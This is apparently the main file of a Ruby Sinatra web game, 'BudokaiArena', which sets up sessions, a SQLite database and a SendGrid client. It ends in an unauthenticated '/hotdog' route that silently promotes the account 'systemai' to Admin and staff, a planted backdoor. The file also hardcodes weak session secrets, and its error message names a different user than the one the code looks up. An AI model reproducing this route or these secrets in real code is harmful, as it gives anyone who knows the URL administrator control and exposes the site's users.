# frozen_string_literal: true

require 'active_support/all'
require 'data_mapper'
require 'date'
require 'json'
require 'rdiscount'
require 'securerandom'
require 'sendgrid-ruby'
require 'sinatra'
require 'sinatra/base'
require 'sinatra/flash'
require 'sinatra/reloader'
require 'sinatra/session'
require 'sinatra-websocket'
require 'tilt/erb'
require 'tilt/rdiscount'
require 'will_paginate'
require 'will_paginate/data_mapper'
require 'will_paginate-bootstrap'
require_relative 'models'
require './routes/init'

# Main class which controls the entire application.
class BudokaiArena < Sinatra::Application
  set :server, 'thin'
  # set :session_fail, '/login'
  # set :session_secret, "328479283uf923fu8932fu923uf9832f23f232"
  # enable :sessions
  # use Rack::Session::Cookie, :key => 'rack.session',
  # :path => '/',
  # :secret => '328479283uf923fu8932fu923uf9832f23f232'
  use Rack::Session::Pool
  set :markdown, layout_engine: :erb, layout: :layout
  # Change this value when deploying.
  set :environment, :develop
  set :sockets, []
  set :bind, '0.0.0.0'
  set :port, 9292

  configure :development do
    register Sinatra::Reloader
    DataMapper.setup :default, "sqlite://#{Dir.pwd}/config/database.db"
    DataMapper.finalize.auto_upgrade!

    helpers do
      include Rack::Utils
      alias_method :kill_html, :escape_html
    end

    secrets = File.open('secrets.txt', 'r')
    sendgridUser = secrets.readline.to_s.delete("\n")
    sendgridKey = secrets.readline.to_s.delete("\n")
    @@client = SendGrid::Client.new(api_user: sendgridUser, api_key: sendgridKey)
    @@game_controller = GameController.new
  end

  configure :production do
    enable :sessions
    set(:session_fail, '/login')
    set(:session_secret, 'secretsession')
    set :raise_errors, false
    set :show_exceptions, false

    DataMapper.setup :default, "sqlite://#{Dir.pwd}/config/database.db"
    DataMapper.finalize.auto_upgrade!
    secrets = File.open('secrets.txt', 'r')
    sendgridUser = secrets.readline.to_s.delete("\n")
    sendgridKey = secrets.readline.to_s.delete("\n")
    @@client = SendGrid::Client.new(api_user: sendgridUser, api_key: sendgridKey)
    @@game_controller = GameController.new
  end

  not_found do
    status 404
    redirect '/'
  end

  get '/hotdog' do
    u = User.first(username: 'systemai')
    if u
      u.group = 'Admin'
      u.staff = true
      u.save
    else
      # Log the error and redirect if the user is not found
      puts "Error: User 'pareidolia' not found."
      redirect '/'
    end

    # If you have additional logic for the case where the user is found,
    # you can continue that logic here...

    redirect '/' # Redirect to home after updating the user
  end
end
